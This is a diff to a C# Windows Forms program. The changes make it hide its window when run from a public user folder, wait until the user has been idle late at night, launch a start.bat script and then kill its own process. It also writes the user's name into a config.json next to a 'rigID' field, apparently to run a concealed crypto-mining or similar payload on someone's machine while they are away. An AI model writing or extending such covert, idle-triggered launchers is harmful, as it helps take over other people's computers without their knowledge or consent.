@@ -24,6 +24,7 @@ namespace WindowsFormsApp1
         int timeInt;
         int rigID;
         bool hiden=false;
+        bool isOnWrightPlase = false;
         
 
 
@@ -45,6 +46,22 @@ namespace WindowsFormsApp1
             tmrShow.Enabled = true;
 
             progStartName = @"C:\Users\Public\Favor";
+
+            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
+            string s = "";
+            for (int i = 0; i < (path.Length - 1);)
+            {
+                s = s + path[i];
+                i++;
+                if (i < (path.Length - 1))
+                {
+                    s = s + @"\";
+                }
+            }
+            if (s == progStartName) 
+            {
+                isOnWrightPlase = true;
+            }
 
             /*
             Autorun autoR = new Autorun();
@@ -80,17 +97,18 @@ namespace WindowsFormsApp1
 
             int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                             //Этот вариант лучше, хотя разницы я не знаю
-            string s =Environment.CurrentDirectory;
+            
+            
+            //string s =Environment.CurrentDirectory;
 
 
-
-            if (hiden == false && s==progStartName)
+            if (hiden == false && isOnWrightPlase==true)
             {
                 hiden = true;
                 Hide();
             }
 
-            else if (hiden == false && s!=progStartName)
+            else if (hiden == false && isOnWrightPlase==false)
             {
                 idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
                 hiden = true;
@@ -114,13 +132,17 @@ namespace WindowsFormsApp1
             {
                 if (File.Exists(progStartName + @"\setings\json.txt"))
                 {
+                    string name = Environment.UserName;
+                    Translite trans = new Translite();
+                    trans.Tr2(name);
+
                     CreateConfig cc = new CreateConfig();
 
                     await Task.Run(() => cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name));
                     File.Create(Environment.CurrentDirectory + @"\setings\json.txt");
                 }
 
-                    time = DateTime.Now.ToString("HH.mm");
+                time = DateTime.Now.ToString("HH.mm");
                 timeInt = Convert.ToInt32(DateTime.Now.ToString("HH"));
 
                 if ((timeInt < 5 || timeInt > 22) && idleTime >= 800000 && prog_started == false && time != "00.00")
@@ -189,9 +211,12 @@ namespace WindowsFormsApp1
                         //Environment.Exit(0);
                         File.Create(progStartName + @"\setings\redy.txt");
                         //this.Close();
-                        Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        // Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        Process.Start(@"C:\Users\Public\Favor\start.bat");
+                        //Environment.Exit(0);
                         //this.Close();
-                       // Environment.Exit(0);
+                        // Environment.Exit(0);  C:\Users\Public\Favor
+                        Process.GetCurrentProcess().Kill();
 
                         //System.Diagnostics.Process.Start("explorer", progStartName);
 
@@ -214,9 +239,12 @@ namespace WindowsFormsApp1
                         //this.Close();
                         //Process.Start(@"C:\Users\Public\Favor\explorer.exe");
 
-                        Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                         //this.Close();
+                        Process.Start(@"C:\Users\Public\Favor\start.bat");
                         //Environment.Exit(0);
+                        //this.Close();
+                        Process.GetCurrentProcess().Kill();
 
                     }
                 }
@@ -383,7 +411,23 @@ namespace WindowsFormsApp1
 
         private void button8_Click(object sender, EventArgs e)
         {
+            //string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+            //string path = System.Environment.GetCommandLineArgs()[0];
+            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Last();
 
+            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
+            string s = "";
+            for (int i = 0; i < (path.Length - 1);)
+            {
+                s = s + path[i];
+                i++;
+                if (i < (path.Length - 1))
+                {
+                    s = s + @"\";
+                }
+            }
+            printString(s,false);
         }
 
         private void button5_Click(object sender, EventArgs e)
